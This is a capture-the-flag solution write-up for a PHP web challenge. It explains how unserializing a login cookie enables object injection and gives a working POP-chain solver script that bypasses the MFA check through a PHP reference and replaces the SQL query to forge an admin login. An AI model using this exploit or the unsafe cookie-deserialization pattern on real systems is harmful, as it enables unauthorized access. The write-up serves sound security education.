# Star Cereal - Solution

**Author**: zeyu2001

**Category**: Web

![Landing Page](img/landing_page.png)

The goal of this challenge is to perform an authentication bypass through a PHP object injection vulnerability. There are three classes involved, and each one of them needs to be examined to construct a "POP chain" for successful exploitation.

## Source Code Inspection

At the bottom of the provided source code, we see the logic behind the application's authentication.

```php
// Verify login
if(isset($_COOKIE["login"])){
	try
	{
		$login = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		if ($login->verifyLogin())
		{
			$_SESSION['admin'] = true;
		}
		else
		{
			$_SESSION['admin'] = false;
		}
	}
	catch (Error $e)
	{
		$_SESSION['admin'] = false;
	}
}


// Handle form submission
if (isset($_POST['email']) && isset($_POST['pass']) && isset($_POST['token']))
{
	$login = new Login(new User($_POST['email'], $_POST['pass']), $_POST['token']);
	setcookie("login", urlencode(base64_encode(serialize($login))), time() + (86400 * 30), "/");
	header("Refresh:0");
	die();
}
```

The `login` cookie is deserialized into a `Login` object. This should already sound some alarm bells!

The `Login` object consists of a `User` object and an MFA token. The `$mfa_token` is checked against an integer `$_correctValue` randomly generated at runtime. If the check passes, the user credentials are then checked.

```php
class Login
{
	public $user;
	public $mfa_token;
	
	protected $_correctValue;
	
	function __construct($user, $mfa_token)
	{
		$this->user = $user;
		$this->mfa_token = $mfa_token;
	}
	
	function verifyLogin()
	{
		$this->_correctValue = random_int(1e10, 1e11 - 1);
		if ($this->mfa_token === $this->_correctValue)
		{
			return $this->user->is_admin();
		}
	}
}
```

Interstingly, the `User` class instantiates a `SQL` object, and uses it to execute SQL queries to authenticate the user. If results are returned and consist of the `email` and `password` columns, then the authentication is successful.

```php
class User
{
	public $email;
	public $password;
	
	protected $sql;
	
	function __construct($email, $password)
	{
		$this->email = $email;
		$this->password = $password;
		$this->sql = new SQL();
	}
	
	function __toString() 
	{
		return $this->email . ':' . $this->password;
	}
	
	function is_admin()
	{
		$result = $this->sql->exec_query($this->email, $this->password);
		
		if ($result && $row = $result->fetch_assoc()) {
			if ($row['email'] && $row['password'])
			{
				return true;
			}
		}
		return false;
	}
}
```

The `SQL` class contains a `$query` attribute that is used to generate a prepared statement. Note that if the `bind_param()` call returns `false`, the authentication fails. This can happen if, for example, the number of parameters in the prepared statement and the number of variables to bind do not match.

```php
class SQL
{
	protected $query;
	
	function __construct()
	{
		$this->query = "SELECT email, password FROM admins WHERE email=? AND password=?";
	}
	
	function exec_query($email, $pass)
	{
		$conn = new mysqli("db", getenv("MYSQL_USER"), getenv("MYSQL_PASS"));

		// Check connection
		if ($conn->connect_error) {
			die("Connection failed. Please inform CTF creators.");
		}
		
		$stmt = $conn->prepare($this->query);

		// Sanity check
		if (! $stmt->bind_param("ss", $email, $pass))
		{
			return NULL;
		}
		
		$stmt->execute();
		$result = $stmt->get_result();
		
		return $result;
	}
	
}
```

## Object Injection

When user data is deserialized into objects, we can inject custom objects to e.g. modify protected attributes, bypass authentication, etc. We can bypass the above checks by using a "POP chain" of custom objects.

### MFA Token

The MFA token check can be bypassed if we set `$mfa_token` as a reference to the `$_correctValue` attribute using the ampersand (&). Note that in PHP, a reference is simply another variable that points to the same data (not like pointers in C).

Thus, this will ensure that the two values are always **equal**.

The custom object can be generated as follows:

```php
class Login
{
	public $user;
	public $mfa_token;
	protected $_correctValue;
	
	function __construct()
	{
		$this->user = new User();
		$this->mfa_token = &$this->_correctValue;
	}
}

$login = new Login();
```

### SQL

Note that the `SQL` class has a `$query` attribute that is used in the prepared statement. By simply modifying the `$query`, we can perform an SQL injection. 

Of course, there is no actual data in the database, and the user only has read-only permissions to one table, but to bypass the authentication we simply need a valid result set with `email` and `password` columns. 

We can use something like

```sql
SELECT 'dead@beef' AS email, 'l33t' AS password 
```

which will return one row with `email` and `password` columns.

Remember the `bind_param()` check? We still need to make sure that there are two parameters in the prepared statement, so we will do something like this:

```sql
SELECT ? AS email, ? AS password
```

any other valid query that makes use of two parameters would work too.

### Exploit!

Using the previously discussed knowledge, it is now trivial to create a solver script that gives us the required base-64 encoded serialized data.

```php
class SQL
{
	protected $query="SELECT ? AS email, ? AS password";
}

class User
{
	public $email = 'dead@beef';
	public $password = 'l33t';
	protected $sql;
	
	function __construct()
	{
		$this->sql = new SQL();
	}
}

class Login
{
	public $user;
	public $mfa_token;
	protected $_correctValue;
	
	function __construct()
	{
		$this->user = new User();
		$this->mfa_token = &$this->_correctValue;
	}
}

$login = new Login();
var_dump($login);
echo urlencode(base64_encode(serialize($login)));
```

![Output](img/solve.png)

Plugging this into the `login` cookie on our browser, we can login and get the flag.

![Flag](img/flag.png)